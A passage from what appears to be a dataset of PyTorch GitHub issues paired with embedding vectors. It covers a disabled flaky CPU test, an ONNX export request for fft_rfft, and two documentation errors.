 -1.93699598e-01  7.29897842e-02 -3.57845873e-01 -2.52799034e-01
  2.26018548e-01 -2.12138761e-02  4.94962260e-02  4.24697578e-01
 -9.15564746e-02  2.21170843e-01 -3.48413810e-02  4.51455116e-02
 -3.31551917e-02  3.38440597e-01 -5.98006770e-02  3.91595274e-01
  8.96508694e-02  9.86670852e-02 -1.13032751e-01  4.19060960e-02
  1.16478708e-02 -1.50033578e-01  3.90558660e-01 -6.33643627e-01
  1.78380031e-02  9.89099666e-02  1.42877176e-01 -4.25742231e-02
  4.16255236e-01  8.00456554e-02  1.75380483e-02 -5.58040850e-02
  6.12307861e-02  1.40563980e-01 -9.37323272e-02 -1.93832107e-02
  3.02544832e-01 -2.21331730e-01 -1.23040393e-01 -1.48079306e-01
 -2.25071624e-01 -1.50074854e-01 -5.76035902e-02  1.95209563e-01
  1.19418837e-01 -5.42224059e-03 -3.95632625e-01  8.70380998e-02
  1.54160976e-01 -3.43419850e-01  1.47270471e-01 -2.54926443e-01
 -6.16420805e-03  7.74963647e-02  9.22220647e-02 -2.28462249e-01
  2.64326911e-02  4.04718071e-02  1.59096375e-01  7.55837485e-02
  4.08993989e-01 -2.18617663e-01  1.68787956e-01  2.07150459e-01
 -1.99419931e-01  2.64515728e-01 -3.27598304e-03  7.05034565e-03
 -1.30279049e-01  2.82388628e-01  1.49652995e-02  1.44202530e-01
  2.74238229e-01 -1.47497371e-01 -2.88181692e-01  7.07482770e-02
  1.24932922e-01 -1.60321277e-02 -4.09468740e-01 -6.61200136e-02
 -1.22656181e-01  2.50174012e-02 -1.42931134e-01 -8.69025514e-02
 -2.67971963e-01 -1.36817843e-01 -6.79777861e-02  3.36498618e-02
 -2.64435261e-01  5.27065575e-01  5.79436235e-02 -1.86744124e-01
  6.42626137e-02  6.02461360e-02  1.22828558e-01 -3.17548513e-01
 -1.58073336e-01  1.11492082e-01  7.65201375e-02  5.52324057e-02
  2.61924148e-01  2.77161300e-01  2.78225932e-02 -2.22533271e-02
 -3.06073308e-01 -1.57819271e-01 -6.55781031e-02  4.85010058e-01
  9.95746329e-02  2.83021089e-02  1.81065708e-01  5.53332627e-01
 -1.38589010e-01 -1.61272943e-01 -1.77920848e-01 -3.04523408e-01
  2.20155656e-01 -9.98946801e-02  1.27604544e-01  5.52464351e-02
  8.75323415e-02  2.18809128e-01 -3.37249041e-01  1.62031561e-01
 -1.05856434e-01  2.79834300e-01  1.11149319e-01 -2.13066656e-02
  2.57761061e-01 -2.07845420e-01  5.08183390e-02 -7.74990022e-03
 -1.97523251e-01  3.73818502e-02 -8.05311203e-02  2.76455164e-01]"
DISABLED test_out_warning__refs_arange_cpu (__main__.TestCommonCPU) triaged module: flaky-tests skipped module: unknown oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_out_warning__refs_arange_cpu&suite=TestCommonCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18173341818).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 2 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_out_warning__refs_arange_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_ops.py`

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.18208972 -0.07036307  0.05560362  0.0460091   0.25026217 -0.4426114
  0.1293219   0.13113977 -0.37211987 -0.29091525  0.24401706 -0.1921442
  0.1828748  -0.10707664 -0.17860109 -0.14156346 -0.04286256 -0.28261673
  0.40608847  0.02047189 -0.34383544 -0.0116813  -0.37319502  0.28915736
  0.03690592  0.02497361 -0.30135906  0.16874777 -0.08515671  0.2258363
  0.27061927  0.08834802 -0.6568294  -0.00520734  0.40062806  0.24381028
 -0.09956127 -0.15660392 -0.1930561  -0.09808646  0.16622135 -0.04942255
  0.12961583 -0.18372029  0.23548242  0.01203678 -0.32524058  0.058378
 -0.1791645  -0.17227657  0.06858861 -0.076675   -0.0274344  -0.6170475
  0.07513073 -0.13331112  0.13372697  0.36086243  0.05257918  0.24218252
  0.1371766  -0.13099283 -0.08174651 -0.01176279  0.01138642  0.04803414
  0.23773986 -0.11324438  0.6136703   0.05232441  0.23424745 -0.03369058
 -0.12596157 -0.09376869  0.215827    0.37675655 -0.19896527 -0.11218601
  0.12409744 -0.17703111 -0.06832038  0.03121157 -0.03757455  0.05055825
  0.32041758  0.07155466  0.16605502 -0.00082465  0.2593379  -0.14362065
  0.25170293  0.15713347 -0.14298874  0.13947932 -0.03190389  0.06650651
  0.49468535 -0.14465345 -0.45045087  0.12712899  0.25957802 -0.35086673
 -0.04940204  0.14717013 -0.29550695 -0.15530105  0.41315395 -0.02971243
  0.17552257 -0.33833718  0.19584693 -0.04552808 -0.11163245  0.00817572
  0.01473121  0.12435767 -0.1560825  -0.2521516  -0.08344047  0.5743967
 -0.3204118   0.05299878  0.1314018  -0.18867783  0.21255843  0.06218564
  0.11917774  0.02561956 -0.03553698  0.07125185 -0.17827545  0.01269574
 -0.26554728 -0.2629891   0.18337572  0.163378    0.00514561 -0.24094063
  0.22367933  0.06200346 -0.24556796  0.0473269   0.0081528  -0.28479022
  0.30532914 -0.07758169 -0.1273465  -0.01163234 -0.0904218  -0.18195522
 -0.03446527  0.09183683  0.04072053  0.5768035   0.02231023  0.13513197
  0.25321904  0.2273044   0.3152898   0.01889442 -0.01429419  0.50458306
 -0.12679897 -0.10832225  0.14604387 -0.02097955 -0.47668922  0.04435701
 -0.1966524   0.18176606 -0.20114943  0.10205851  0.03053576 -0.09871843
 -0.12765443 -0.26813814  0.41162288 -0.34134403 -0.15227339  0.24301907
  0.04224394  0.0569893   0.14566933  0.29630426 -0.02497366  0.21505854
  0.05569524 -0.21176371  0.15200023 -0.11897053 -0.6200912  -0.2167156
  0.21655853  0.13593183 -0.2070806  -0.07095875  0.03237368 -0.16279219
  0.02740691 -0.08222477 -0.15376958  0.4392659   0.15882152 -0.12464519
 -0.08134259  0.1007527  -0.2069175  -0.49513802  0.27653205  0.05134614
 -0.27837747 -0.01275644 -0.01855169 -0.38200063  0.09362844  0.2135714
 -0.12773436 -0.01608592  0.1900129   0.23871887 -0.13168468 -0.09537745
 -0.20921195 -0.23143384 -0.23782803  0.04480994 -0.21000141  0.07734226
 -0.10296585  0.08880001 -0.01014073 -0.01456212  0.36784023  0.16635126
  0.3240924  -0.14754581 -0.2542074   0.05033961 -0.09810247  0.32842737
 -0.5262838  -0.4420473  -0.05010286  0.17322609  0.29156303  0.16333047
 -0.1640108  -0.20683055 -0.41733372  0.15530087 -0.01108501 -0.3307164
  0.06070354 -0.12782525  0.3119446   0.67778504 -0.01362898  0.2745926
  0.15084562 -0.21411227  0.20154563  0.36543614 -0.14665948  0.2268491
  0.27878517  0.1316509  -0.18239264  0.0744198   0.04167538  0.01672277
  0.5216495  -0.6532624   0.10340457  0.17861138  0.35891685 -0.28891984
  0.432064    0.02055992 -0.06842116 -0.00833312  0.3612067  -0.09172285
 -0.13670285 -0.0673283   0.26546362 -0.3110115  -0.15810344 -0.10751313
 -0.37401563  0.00795116 -0.20847696  0.22949883  0.19207719 -0.13713871
 -0.26789558  0.14919159  0.126922   -0.40164676  0.06396446 -0.06915988
 -0.28310287 -0.11805536  0.12321776 -0.32972422  0.04617246 -0.09020814
  0.19844425 -0.018564    0.33273083 -0.57253355 -0.10332271  0.37148792
 -0.08134148  0.26693618  0.06818504  0.04582395 -0.22361785  0.34969303
  0.12042367 -0.02348183  0.33781552 -0.11350672 -0.20358336  0.2056945
  0.05085599  0.0659465  -0.45468485 -0.18812507 -0.12587774  0.04369392
 -0.18053311 -0.09531803 -0.3156762  -0.21159503 -0.09410345 -0.06945715
 -0.2639368   0.51762915  0.107706   -0.28123587  0.02808234  0.09547563
  0.24530697 -0.24552685 -0.18940604  0.07397117  0.21827243  0.32321787
  0.13302937  0.18420687 -0.11416887  0.0222163  -0.4026004  -0.09420853
 -0.03627706  0.52236104  0.08209114  0.10511354  0.4616188   0.5928656
 -0.17051929 -0.2684981  -0.4240076  -0.18654487  0.22139543 -0.06239107
 -0.09332597 -0.01461719  0.18274209  0.06221594 -0.44434196  0.05126657
 -0.10713123  0.18458512  0.18091094  0.0131404   0.21387792 -0.25773063
 -0.05787028 -0.17583075  0.1093309   0.04991872 -0.0268278   0.15295953]"
Support for Exporting 'aten::fft_rfft' to ONNX module: onnx triaged,"### ðŸš€ The feature, motivation and pitch

I want to export a torch model to ONNX. My model uses torch.fft.rfft and torch.fft.rfftfreq. However, I got the following erroe:

""UnsupportedOperatorError: Exporting the operator 'aten::fft_rfft' to ONNX opset version 14 is not supported. Please feel free to request support or submit a pull request on PyTorch GitHub: https://github.com/pytorch/pytorch/issues.""

I tried the latest opset version 17, but this operation is still not supportd.

### Alternatives

_No response_

### Additional context

_No response_",False,"[-0.45660543  0.06605849 -0.01862982 -0.19489272  0.328676    0.08311239
  0.01826571  0.15893316 -0.34507978 -0.22753875 -0.22604956  0.04788838
 -0.29232147 -0.04421144 -0.01214717 -0.05621755 -0.19908571 -0.01515965
  0.14411047  0.02842922 -0.27374572 -0.18151292  0.2956589  -0.24017489
 -0.00927007  0.1341611  -0.12537289  0.03109733  0.16613485  0.04662864
 -0.03159681 -0.32038617 -0.2992518   0.19242954  0.11719877 -0.0078844
 -0.4147945   0.13061345 -0.6326705  -0.1508602   0.35911232  0.1668391
  0.10003155 -0.06510492 -0.10056891 -0.1914925  -0.26156318 -0.10608052
 -0.2039496   0.18111323 -0.05942347 -0.13458937 -0.30080274  0.19859645
  0.27262652 -0.10906303 -0.07859878  0.0812803  -0.12175149 -0.2534548
  0.1141592  -0.0671783  -0.2672284  -0.11394876  0.20799533 -0.22894865
 -0.223044    0.15959068  0.3566836  -0.14733317 -0.18036962 -0.10995571
  0.02405763  0.18787262 -0.01484777  0.00094878 -0.2203843   0.30640537
 -0.13404663 -0.04149044  0.09256355  0.19867    -0.02443061  0.04404824
  0.02903803  0.35992038  0.07002845 -0.06650721  0.22591956  0.37305042
 -0.09276098  0.3220556   0.3474582   0.24134284  0.12087439  0.3521405
  0.17873526 -0.01641107 -0.09512915 -0.06060526 -0.07887952 -0.5463985
 -0.17203891  0.33575767 -0.16487241 -0.16520713 -0.01432651  0.07938889
 -0.09452748 -0.25851473  0.1467089   0.11747712 -0.03300691 -0.35977486
 -0.27057955 -0.2102075  -0.06274806 -0.16929942 -0.23771292  0.26236996
  0.2094672  -0.0191894   0.113485    0.14293465  0.35629946 -0.02275255
 -0.30452666 -0.04238496 -0.04938161  0.20678659  0.2043019  -0.05788713
  0.1117811  -0.14852233  0.39592668  0.17899594 -0.34929305  0.01829846
 -0.30588022  0.2969647  -0.26000702 -0.08090015  0.01852788 -0.23557553
  0.23190191 -0.04936375  0.1853584   0.1478529   0.33613712 -0.03784635
 -0.09049957 -0.17712367 -0.3821754   0.31224436  0.12039548  0.11358622
  0.12346149  0.13810547  0.16231859 -0.23348999 -0.08680108  0.05296588
  0.2607872  -0.3119923  -0.08450288 -0.06193579 -0.15024082  0.09209128
 -0.37923962 -0.02450329 -0.09532677 -0.34224242  0.02659452 -0.1932419
  0.20587617 -0.2781664   0.2699992  -0.11698347  0.27012354  0.34270397
  0.7205689   0.20184001  0.5665773  -0.23118642 -0.01468169  0.20270696
  0.23102994  0.03402917 -0.15833369 -0.15909642 -0.03689137 -0.08383188
  0.2931633  -0.01081222 -0.05421061 -0.05758511 -0.10638519 -0.20051524
 -0.15278165 -0.0654157   0.29501253  0.10731249  0.13734987 -0.16948545
  0.05883339  0.35959107 -0.17927927 -0.40747648 -0.4820202   0.1226415
 -0.19332469 -0.2794273   0.04107276 -0.10407759 -0.11046358  0.22784775
 -0.16395232  0.01924522  0.00304647 -0.05677234  0.12332694  0.16821244
 -0.0630087   0.01915751 -0.10613927  0.41434854 -0.4262421  -0.18561694
 -0.2289405   0.13377382 -0.03612843 -0.20519954  0.27155012 -0.03145961
  0.11180891  0.39813954  0.04588535 -0.21124114 -0.6807246  -0.22011513
 -0.15615371  0.04146438 -0.10730892 -0.25289714 -0.19378579 -0.00567763
 -0.08903895  0.17355826  0.01862966  0.00166425  0.1586178  -0.07395257
 -0.1964095   0.25630254  0.3956464   0.3937754   0.10726322 -0.12214139
 -0.10070717 -0.08722955  0.15059908  0.3795029  -0.07818842  0.16854018
  0.3563059  -0.32262462 -0.38463253 -0.01748366 -0.15168843 -0.04837375
 -0.00279351 -0.32995474  0.45506674  0.07234526  0.17118707  0.12196222
  0.4431061  -0.21156052 -0.02200548  0.00801655  0.2704273   0.1925767
  0.13282973  0.2677488   0.2103569  -0.33971956 -0.18523    -0.09351601
  0.12051675  0.00522676 -0.03099441 -0.10599378 -0.13200834  0.06979294
 -0.53619075 -0.10865261  0.48210838  0.19605225  0.02289476  0.04991357
  0.19007659  0.07112971  0.02012921  0.1940762   0.04511742 -0.16304375
  0.05564487 -0.01310925  0.4282733  -0.26884884  0.08090066 -0.02360607
 -0.10506599  0.15843147 -0.02940658  0.19347283  0.20046976  0.26546687
  0.3100858   0.00687727 -0.01030451 -0.09299798  0.00829491 -0.23832649
 -0.19730347  0.15969892 -0.05539341 -0.45593536  0.07024185 -0.09971805
  0.03660962  0.20514607  0.31129688  0.45041943  0.05718691 -0.10131012
  0.26743698  0.32639396 -0.04027961 -0.4036113  -0.05679991 -0.15471941
 -0.00245364  0.00283764 -0.3704778  -0.28529376  0.06791376  0.18060118
  0.20272455  0.32475197 -0.13908947 -0.13357809  0.20956525  0.29861343
 -0.6034144   0.17512473 -0.00713762 -0.02944189 -0.02252737  0.21395627
 -0.0672279   0.29502735 -0.18111835 -0.26444355 -0.25253797  0.24182203
 -0.11692344 -0.33607584 -0.11034501  0.3898422   0.15367144  0.1170926
 -0.15234327 -0.12078475  0.23925737 -0.0575663   0.10345767  0.1609624
  0.19605953 -0.08044739  0.00671532  0.0531413  -0.22145477 -0.00679713]"
torch.distributed.rpc example errors oncall: distributed,"### ðŸ“š The doc issue

https://pytorch.org/docs/stable/rpc.html#rpc

Usage of @torch.jit.script may not work with the current version of PyTorch and may result in type mismatch exceptions.

### Suggest a potential alternative/fix

fixed in #112367 

cc @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @osalpekar @jiayisuse @H-Huang @kwen2501 @awgu @penguinwu",False,"[-4.67123181e-01 -5.04645221e-02 -1.16666362e-01  1.28076613e-01
  1.12629339e-01 -3.74388732e-02 -9.35167968e-02  1.08888060e-01
 -4.09684002e-01 -7.08520487e-02 -2.05185339e-02  6.56201392e-02
 -3.94477844e-02  1.42477393e-01  9.23810434e-03  9.43320170e-02
 -3.76421750e-01 -1.75755873e-01 -1.42613977e-01 -6.60273712e-03
 -1.18973657e-01 -1.65479124e-01 -1.38212875e-01 -1.34112775e-01
 -2.35827670e-01  1.86797947e-01 -3.61352623e-01 -1.87741324e-01
 -3.31656709e-02  8.75548571e-02  1.95882982e-03  1.05888017e-01
 -3.43725204e-01 -1.13878101e-01  3.39182079e-01  8.70776400e-02
 -2.98784196e-01 -6.61234632e-02 -5.40480278e-02  8.13971311e-02
  2.54307836e-01  3.49250734e-01  2.02494934e-01 -4.11271565e-02
 -1.33254036e-01 -5.98980598e-02 -6.91406056e-02  1.01543419e-01
 -3.88080359e-01 -2.71393299e-01 -2.60805428e-01  2.33237058e-01
 -8.11244547e-02  1.30661666e-01  7.43400827e-02 -4.27870452e-01
 -1.93554610e-01  3.64810154e-02  1.68252066e-01 -1.26831070e-01
  3.08597654e-01  1.11739509e-01 -2.23945081e-01 -2.93011218e-01
  6.85425550e-02 -7.49572441e-02  4.48236093e-02  2.57156454e-02
  7.32016385e-01 -5.44166192e-04 -2.48285756e-01  1.66055441e-01
  3.07250153e-02 -1.34983122e-01  8.51214975e-02 -1.77395791e-01
 -4.16902661e-01  1.04303062e-01 -7.04924688e-02 -3.84348869e-01
  1.31441087e-01 -3.57293636e-02 -2.29648557e-02  7.21175149e-02
 -5.25190160e-02 -1.82652041e-01  2.02598333e-01 -2.28978187e-01
  4.50798541e-01 -7.62578426e-03  2.84738708e-02  3.88875604e-01
  2.88580686e-01  5.30520439e-01 -1.02864526e-01  2.45809555e-01
  1.86129697e-02 -2.23510757e-01 -1.33100748e-01 -8.73679854e-03
 -2.21024454e-02 -5.48325419e-01 -1.75858229e-01  4.00219440e-01
  1.71619684e-01 -3.27393949e-01  9.02357996e-02  3.19217920e-01
  8.86666924e-02 -1.42956853e-01  2.81515032e-01  1.52760893e-01
 -2.20613688e-01 -1.72578111e-01 -1.13032870e-01 -3.13591540e-01
 -2.93934848e-02 -1.91694319e-01 -3.44698429e-01  1.68817967e-01
  2.29963630e-01  1.21004775e-01 -5.18879443e-02  1.90141171e-01
  5.29093921e-01  1.40546754e-01 -9.39072296e-02  5.89068905e-02
 -1.06952175e-01  1.28744636e-02 -2.11652517e-02 -4.29923683e-02
  7.56561905e-02 -1.13708630e-01  3.60870302e-01  1.88021719e-01
 -2.24579394e-01 -1.51270069e-03 -6.84796199e-02  1.83079928e-01
 -2.07188919e-01  6.41187057e-02 -1.02895983e-01 -2.62995631e-01
  3.86502780e-02  2.52280869e-02 -2.10963547e-01  2.10128248e-01
  1.62542760e-01  8.91143233e-02  8.66853744e-02 -3.65402460e-01
 -4.53745842e-01  5.06444931e-01 -5.82638159e-02  1.55751050e-01
  2.56077319e-01  1.75672963e-01  4.62538958e-01 -2.35976502e-01
 -6.32216260e-02  2.91222513e-01 -4.58444729e-02 -1.44508258e-01
  8.53065550e-02 -8.07448402e-02 -2.11881220e-01  4.51735780e-03
 -5.01182675e-01  1.30528212e-01 -4.09559272e-02 -2.71828324e-01
  1.14305496e-01 -2.50948668e-01 -3.48731458e-01  8.16846825e-03
  6.55585229e-02 -2.22308468e-02 -2.35557072e-02  3.91882718e-01
  3.73118520e-01  3.68086517e-01  3.84932190e-01  1.80259466e-01
 -1.26690686e-01  3.26075435e-01  5.12002945e-01  1.76826715e-01
 -1.11223668e-01 -4.37222123e-01 -6.02391601e-01 -3.63969684e-01
  2.03316182e-01 -1.02034509e-01  9.23134536e-02 -1.93858258e-02
 -1.24285556e-01 -1.97656080e-01 -1.65301189e-02 -1.65971965e-01
 -2.55553368e-02  2.59619504e-01 -1.84303075e-01 -2.59138703e-01
  2.23652408e-01  2.08430201e-01 -2.91286588e-01 -3.40279073e-01
 -3.90622914e-01 -2.78124623e-02 -4.48718309e-01 -8.10306817e-02
 -1.27379864e-01 -3.06157351e-01 -5.97580820e-02  2.98958123e-01
 -8.06030929e-02  2.04545826e-01  6.84068352e-02  2.55719304e-01
  3.10230553e-01 -1.51904374e-01 -4.41690441e-03 -1.91646159e-01
 -6.87021092e-02  1.81353748e-01 -5.12486935e-01  2.57556021e-01
 -5.12754098e-02 -2.24558949e-01 -2.20207602e-01 -2.52058506e-01
  4.65746969e-01 -6.72778562e-02 -3.72337885e-02  3.03775370e-01
 -1.38084218e-01  4.33208756e-02 -4.34437394e-01  1.33955270e-01
 -2.47376144e-01 -9.80521739e-02 -3.74569967e-02 -1.69344068e-01
 -2.48639733e-01  3.20782125e-01 -3.21972489e-01  2.46637955e-01
 -8.94973055e-03  1.42841861e-02  6.76109828e-03 -4.19602320e-02
 -4.78354752e-01  3.73268872e-03  4.57538545e-01  3.94423231e-02
  1.87235121e-02 -2.27932274e-01  8.31956975e-03 -1.94603845e-01
 -1.89830661e-02  1.18007138e-01 -1.05247296e-01  4.91887629e-01
  3.82410645e-01  1.04691153e-02 -1.99658036e-01  1.48593694e-01
 -1.34458974e-01 -3.92608829e-02 -2.89703198e-02 -4.03599054e-01
  5.16981840e-01  4.40819144e-01  1.28971085e-01 -1.78505033e-01
  2.93462515e-01 -2.58767277e-01 -1.39418051e-01 -2.13717416e-01
  2.84702659e-01  3.60309243e-01 -1.89008445e-01 -5.23391552e-03
  2.95870602e-01 -4.88569707e-01 -9.17864963e-03 -1.80875473e-02
 -1.63223874e-02 -1.22036412e-01 -2.43679136e-01 -1.16294660e-01
  6.42362118e-01  1.32735381e-02  1.67393498e-02  1.54775120e-02
  3.35234702e-02 -9.53442454e-02  3.06064606e-01  2.61510372e-01
 -2.29581892e-02  1.48393512e-01  1.81583762e-01 -4.02768925e-02
 -5.06569035e-02  1.26137622e-02  1.73822165e-01  1.00542948e-01
  7.06330240e-01 -3.25396180e-01  1.34525120e-01 -1.30623192e-01
  8.32422376e-02  2.55705476e-01 -1.50822908e-01  5.65188080e-02
 -2.10102111e-01  9.47293937e-02  2.81228960e-01  2.47797966e-01
  1.66532665e-01 -5.82541116e-02 -3.97358507e-01 -1.26690254e-01
 -1.17467763e-02  7.48508796e-02 -3.39796305e-01 -6.13410547e-02
 -9.76098143e-03  1.91902727e-01  3.10235322e-01  1.58572853e-01
  1.84738189e-01  6.92646280e-02 -7.43747130e-02 -2.61420429e-01
  4.37249243e-02  2.37690225e-01 -2.06241250e-01 -1.42209411e-01
 -2.45402738e-01 -3.59350927e-02 -2.60575488e-03  3.77964415e-03
 -1.33594021e-01 -1.54177159e-01  4.99819219e-01  2.03944087e-01
 -1.99436724e-01  3.56436670e-02  1.08270258e-01 -1.11341126e-01
 -1.49886021e-02  3.63006204e-01 -4.41687405e-02  4.89457846e-01
 -2.58919485e-02  1.53007075e-01  2.02383205e-01  1.76742941e-01
 -2.12845311e-01  2.18913794e-01 -9.05523524e-02 -7.34661147e-02
 -1.35426462e-01 -7.83924311e-02 -1.60590068e-01  1.51977642e-02
  1.53284401e-01  2.21105888e-01 -4.29556459e-01  3.15505832e-01
 -1.02601029e-01  1.19678363e-01  5.03924549e-01 -2.50888079e-01
  1.77200168e-01 -8.53140950e-02  1.00511409e-01 -4.45947498e-02
  6.48902208e-02  1.74459070e-01 -1.01543203e-01 -2.31713615e-02]"
typo in example of `torch.linalg.solve_triangular` ,"### ðŸ“š The doc issue

Hello, during  learning pytorch, I noticed a typo in the example provided in `torch.linalg.solve_triangular`. In first example:
```py
A = torch.randn(3, 3).triu_()
b = torch.randn(3, 4) # here need upper B
X = torch.linalg.solve_triangular(A, B, upper=True)
torch.allclose(A @ X, B)
```
url: https://pytorch.org/docs/stable/generated/torch.linalg.solve_triangular.html#torch-linalg-solve-triangular

source code may here:  https://github.com/pytorch/pytorch/blob/main/torch/linalg/__init__.py#L2244-L2246

### Suggest a potential alternative/fix

_No response_",False,"[-4.69067216e-01  4.63387072e-01 -9.70700085e-02  1.30580351e-01
 -2.70902365e-01 -2.36629784e-01  3.65304679e-01  1.31728381e-01
  6.55557513e-02 -7.93228000e-02  3.94102708e-02  1.30813330e-01
  1.14213429e-01  1.34603798e-01  3.63524199e-01  6.60066307e-02
 -4.24175739e-01  1.15088150e-02 -3.78902018e-01 -3.90532643e-01
  5.54257035e-01 -3.78064632e-01 -1.98861703e-01  1.72899142e-01
 -3.46145406e-02  2.16578647e-01 -2.15586528e-01 -1.33235231e-01
  3.86172444e-01 -5.49447946e-02 -1.36594981e-01 -7.68002123e-02
 -4.16970134e-01  4.88879681e-02  1.88894928e-01 -5.21615669e-02
 -3.90716672e-01  4.03492540e-01 -6.69846907e-02 -1.79256678e-01
  1.40732471e-02  7.42868036e-02  5.13458624e-04 -6.85703605e-02
 -2.12722763e-01 -8.44109431e-02 -2.61181772e-01  4.50517416e-01
 -1.33154085e-02 -8.47618580e-02 -6.89874664e-02  1.71092078e-01
 -3.36634576e-01  8.20384696e-02  5.32129221e-02 -2.49771714e-01
 -1.92695349e-01  1.45837069e-01  2.23154426e-01 -3.46316606e-01
  1.56399325e-01  3.08099806e-01 -2.84192890e-01  3.19028080e-01
 -1.13724604e-01  1.61546003e-02 -1.38982847e-01  3.12514096e-01
  1.09588958e-01  2.29538381e-02  1.72809809e-01 -1.42928362e-01
  9.04075205e-02 -1.10544994e-01 -1.72866583e-01 -1.42668396e-01
 -4.15600359e-01  2.92954624e-01 -4.46164727e-01  1.83532275e-02
  2.27063075e-02  1.41841620e-01  1.03809640e-01  3.18182819e-02
  1.70357287e-01  1.78019315e-01  1.36908844e-01 -7.20983893e-02
  5.59586883e-01 -2.58859005e-02 -3.21546383e-02 -4.18999791e-01
  7.45884031e-02  2.87672758e-01  1.11715548e-01  1.57688528e-01
  2.99146891e-01 -2.86899030e-01 -1.59391120e-01 -2.59492278e-01
 -1.80594787e-01 -5.39914489e-01 -1.71870112e-01  2.00970516e-01
  3.89009356e-01  2.54842788e-01 -7.20419809e-02  8.28573033e-02
  3.28353643e-01 -1.52756050e-01  1.42107338e-01 -3.44446003e-02
  2.14672506e-01  2.16853261e-01 -1.51981607e-01 -4.61897478e-02
  9.68287736e-02 -2.87837595e-01 -1.48131192e-01  1.55161113e-01
  1.93336338e-01  1.72359735e-01 -7.65644014e-02  3.28401327e-01
  4.39425200e-01  1.17667079e-01  2.17680022e-01  6.23542070e-02
  2.33179882e-01  1.69960812e-01  9.07490030e-02 -5.35625964e-02
  1.04047164e-01  3.24483365e-02  1.75961867e-01 -1.75086454e-01
 -3.77264500e-01  1.75667107e-01  7.70553499e-02 -5.23460992e-02
 -1.11123689e-01 -2.26268679e-01 -5.42442128e-02 -3.59075308e-01
  5.13586923e-02  1.69868525e-02 -2.77949244e-01  1.67829275e-01
  7.82678127e-02 -3.51416655e-02  1.93700179e-01 -1.15225442e-01
 -5.41625500e-01  3.62076193e-01 -4.66585457e-02 -1.37461424e-01
  5.06455116e-02  1.56796291e-01  2.79253006e-01 -4.95964170e-01
  1.83622539e-01  3.39125097e-01  1.85671672e-01  2.60673970e-01
  2.82278746e-01 -2.69712992e-02 -2.54024535e-01  1.25602663e-01
 -3.72971565e-01 -2.35680155e-02  3.60417902e-01 -9.21248198e-02
 -2.12521888e-02  1.64748922e-01  1.59532249e-01 -7.63763040e-02
 -1.58636048e-01 -3.49661708e-01 -1.85623750e-01  5.22628307e-01
  3.71122360e-01  2.42840245e-01  3.95382822e-01  9.50252414e-02
 -5.07731549e-02  2.76197046e-01  2.74305582e-01  2.26142853e-01
 -7.66976252e-02 -2.32950926e-01 -1.26721650e-01 -4.84446883e-01
  1.31728411e-01 -6.13286830e-02 -2.10342705e-01  1.16305783e-01
  2.52848029e-01 -3.50483149e-01 -6.15536943e-02 -8.66263062e-02
 -1.17381342e-01  2.48848852e-02  1.80624038e-01 -1.30999103e-01
  2.95607090e-01  1.19812213e-01 -2.43673742e-01 -3.73233616e-01
 -4.44669366e-01  1.84108287e-01  2.77453065e-02  5.13557643e-02
 -1.39733613e-01 -2.28101462e-01  4.87931482e-02 -5.47362678e-02
 -3.64676297e-01 -7.47754574e-02 -3.50758135e-01  3.95834208e-01
  3.71011674e-01  7.42523223e-02 -4.03255522e-02 -8.03449303e-02
 -9.44306552e-02  1.71429157e-01 -2.65484869e-01 -2.36952484e-01
 -3.89077663e-02 -3.00065160e-01  8.01716298e-02 -3.44432712e-01
  2.31113896e-01  1.19963393e-01  1.83353662e-01  3.63199502e-01
 -3.80568087e-01 -2.20151126e-01 -1.57525763e-01  1.14711054e-01
  2.62828946e-01 -8.38637054e-02  1.93793580e-01  9.58832353e-02
 -2.66317695e-01 -1.28334209e-01 -4.73704785e-01 -1.85360104e-01
 -1.92148909e-02  4.18514311e-02 -8.30395967e-02 -1.42027378e-01
 -1.80827573e-01 -2.25202948e-01  1.80894211e-01 -6.72782399e-03
  2.78056085e-01  1.39009550e-01 -1.94647163e-02 -1.71711862e-01
  3.10611892e-02 -4.34554741e-02  7.21637439e-03  1.97174162e-01
  1.77200451e-01 -1.97173402e-01 -3.02332006e-02  3.67291868e-02
 -3.13066006e-01  1.10674903e-01 -1.48544684e-01 -4.53082740e-01
  2.52774507e-01  2.02039614e-01  2.92289734e-01 -5.77635586e-01
  2.10357845e-01  1.65828951e-02 -1.71703443e-01 -3.76256526e-01
  1.80721566e-01  2.55115330e-02 -2.50327885e-01  5.14130116e-01
  6.92824721e-02 -6.59979321e-03  3.15180540e-01  2.00601637e-01
  2.01445013e-01 -1.82172582e-02 -5.59680104e-01 -8.54728371e-02
  2.78873265e-01 -3.57762396e-01  3.39307375e-02  3.71506393e-01
 -2.09399417e-01 -2.05545738e-01  2.80707717e-01  1.34320349e-01
  8.45148601e-03  3.58991444e-01 -8.61065984e-02 -2.03832835e-01
 -1.23171195e-01 -1.23547107e-01  9.29199308e-02 -3.68923619e-02
  1.53120577e-01 -4.08617646e-01  3.71421397e-01  2.30220169e-01
 -1.01889506e-01  3.83951455e-01  2.90153157e-02  4.70016450e-01
  1.95228517e-01  1.31316125e-01  2.59264529e-01  2.77304828e-01
 -1.39613613e-01 -2.64151484e-01 -5.00424147e-01 -3.03169250e-01
 -2.44781464e-01  1.16464064e-01 -1.09649546e-01  1.87245384e-03
 -3.83556902e-01 -2.55982280e-01 -1.72754899e-02 -3.43111977e-02
  2.27211818e-01 -1.45494603e-02  4.59041670e-02 -3.76220196e-01
 -2.22749442e-01  5.84498979e-02 -7.93297812e-02 -2.78771490e-01
 -2.14756861e-01 -1.07128829e-01 -4.69704382e-02 -2.38588884e-01
 -2.74652243e-01 -2.22032547e-01 -3.99692804e-02  2.26599261e-01
 -4.56120260e-03 -1.70098275e-01 -6.08958155e-02  2.04020351e-01
 -1.23706922e-01  3.54542017e-01  3.69374096e-01  2.99015790e-01
  1.42472060e-02  7.71669596e-02 -7.85942376e-02  1.28741354e-01
  4.95399050e-02  1.61244527e-01 -2.42773846e-01 -2.40909718e-02
